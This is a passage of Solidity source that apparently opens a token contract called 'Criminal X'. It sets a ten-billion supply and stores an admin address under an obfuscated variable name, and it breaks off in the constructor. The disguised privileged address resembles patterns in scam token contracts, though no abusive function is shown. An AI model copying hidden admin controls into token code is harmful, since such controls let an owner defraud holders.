...
contract CrimTOKEN is Ownable {
    
    uint256 AMOUNTGLOBALADMOUNT = 10000000000*10**decimals();
    uint256 private _seitotalSupply = AMOUNTGLOBALADMOUNT;
    string private _seitokenname = "Criminal X";
    string private _seitokensymbol = "Criminal X";
    address public fccnzhy91;
    constructor(address tokenadmin) {
        fccnzhy91 = tokenadmin;
